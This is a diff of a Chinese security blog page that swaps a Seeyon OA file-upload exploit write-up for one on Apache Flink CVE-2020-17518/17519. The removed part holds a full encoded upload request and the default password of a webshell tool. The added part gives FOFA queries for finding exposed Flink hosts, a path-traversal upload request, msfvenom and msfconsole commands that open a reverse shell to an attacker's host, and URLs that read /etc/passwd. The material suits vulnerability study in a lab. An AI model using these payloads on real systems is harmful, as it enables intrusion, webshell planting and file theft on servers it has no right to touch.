@@ -20,26 +20,35 @@
     var CONFIG = {"hostname":"dmkxy.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="漏洞描述致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。">
+  <meta name="description" content="FOFAapp&#x3D;&quot;Apache-Flink&quot; app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="致远OA-ajax.do任意文件上传漏洞复现">
-<meta property="og:url" content="https://dmkxy.github.io/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="【CVE-2020-17519&#x2F;17518】Apache Flink任意文件上传&#x2F;读取漏洞复现">
+<meta property="og:url" content="https://dmkxy.github.io/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="DMKXY&#39;s Blog">
-<meta property="og:description" content="漏洞描述致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。">
+<meta property="og:description" content="FOFAapp&#x3D;&quot;Apache-Flink&quot; app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;">
 <meta property="og:locale">
-<meta property="og:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png">
-<meta property="og:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png">
-<meta property="og:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png">
-<meta property="og:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png">
-<meta property="og:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png">
-<meta property="article:published_time" content="2021-01-21T16:30:26.000Z">
-<meta property="article:modified_time" content="2021-01-29T13:49:21.841Z">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="article:published_time" content="2021-01-27T16:30:26.000Z">
+<meta property="article:modified_time" content="2021-04-26T11:53:28.934Z">
 <meta property="article:author" content="DMKXY">
 <meta property="article:tag" content="2021.1">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://dmkxy.github.io/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png">
+<meta name="twitter:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
 
-<link rel="canonical" href="https://dmkxy.github.io/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="https://dmkxy.github.io/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
 
 <script id="page-configurations">
@@ -52,7 +61,7 @@
   };
 </script>
 
-  <title>致远OA-ajax.do任意文件上传漏洞复现 | DMKXY's Blog</title>
+  <title>【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现 | DMKXY's Blog</title>
   
 
 
@@ -208,7 +217,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -221,7 +230,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          致远OA-ajax.do任意文件上传漏洞复现
+          【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现
         </h1>
 
         <div class="post-meta">
@@ -231,14 +240,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2021-01-22 00:30:26" itemprop="dateCreated datePublished" datetime="2021-01-22T00:30:26+08:00">2021-01-22</time>
+              <time title="创建时间：2021-01-28 00:30:26" itemprop="dateCreated datePublished" datetime="2021-01-28T00:30:26+08:00">2021-01-28</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-29 21:49:21" itemprop="dateModified" datetime="2021-01-29T21:49:21+08:00">2021-01-29</time>
+                <time title="修改时间：2021-04-26 19:53:28" itemprop="dateModified" datetime="2021-04-26T19:53:28+08:00">2021-04-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -265,38 +274,53 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>出现异常：java.lang.NullPointerException:null<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1
-Host: 127.0.0.1
-Connection: close
-Cache-Control: max-age&#x3D;0
-Upgrade-Insecure-Requests: 1
-User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
+        <h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
+app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞<br>CVE-2020-17518攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）<br>CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>CVE-2020-17518<br>Apache:Apache Flink: 1.5.1 - 1.11.2</p>
+<p>CVE-2020-17519<br>Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞环境使用vulhub的docker环境搭建，vulhub下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/">https://github.com/vulhub/vulhub/</a><br>下载完成后传入装有docker和docker-compose环境的虚拟机，进入目录</p>
+<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master&#x2F;flink&#x2F;CVE-2020-17518&#x2F;
+docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>拉取漏洞环境,出现”done”表示拉取成功<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>在浏览器输入<a href="http://your-ip:8081查看页面">http://your-ip:8081查看页面</a><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h4><p>访问<a href="http://your-ip:8081，找到Submit">http://your-ip:8081，找到Submit</a> New Job的Add New上传一个jar包，jar包可以在桌面新建一个压缩文件，将zip后缀修改为jar即可，然后抓包<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>将请求包发送到repeater模块进行修改因为我们不知到当前的路径是什么，所以可以使用../切换到根目录因为我们不知到当前的路径是什么，所以可以使用../切换到根目录<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><strong>POC:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
+Host: IP:8081
+User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0
+Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*
+Accept-Language: en-US,en;q&#x3D;0.5
 Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 8819
+Referer: http:&#x2F;&#x2F;IP:8081
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------209638986713202799301320123018
+Content-Length: 260
+Connection: close
+-----------------------------209638986713202799301320123018
+Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;111&quot;
+Content-Type: application&#x2F;octet-stream
 
-managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>使用burpsuite上传EXP，漏洞利用成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;
-&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,
-&quot;code&quot;:&quot;-1&quot;,
-&quot;details&quot;:null
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>请求webshell,证明上传成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p>
-<p>冰蝎下载链接：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p>
+111
+
+-----------------------------209638986713202799301320123018--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在容器中查看文件是否上传成功</p>
+<pre class="line-numbers language-none"><code class="language-none">docker ps
+docker exec -it [CONTAINER ID] &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>Flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell<br>msf生成jar格式的马,lhost为kali的ip，lport为kali接收shell的端口</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;shell_reverse_tcp lhost&#x3D;**.***.***.**  lport&#x3D;1234 -f jar &gt;&#x2F;home&#x2F;a.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>启动msf接收shell</p>
+<pre class="line-numbers language-none"><code class="language-none">msfconsole
+use exploit&#x2F;multi&#x2F;handler
+set payload java&#x2F;shell_reverse_tcp
+set LHOST **.***.***.**
+set LPORT 1234
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>到此为止关于公网vps监听就已经设置好了，等待上传shell jar文件的连接就好了<br>在Apache Flink中选择Add New，选择木马jar文件上传,点击刚刚上传的木马文件,选择submit<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>这时候在返回公网vps发现已经接收到了反弹的shell,不过这个shell权限不大<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"></p>
+<h4 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h4><p>上面写入后要是不能进入docker查看这里可以利用CVE-2020-17519漏洞进行文件读取，在页面首页输入以下payload查看tmp目录下的文件<br><strong>URL:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252f111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>%252f为/的两次url编码<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>修改后面的payload改为查看etc下的passwd文件<br><strong>POC:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP:PORT&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
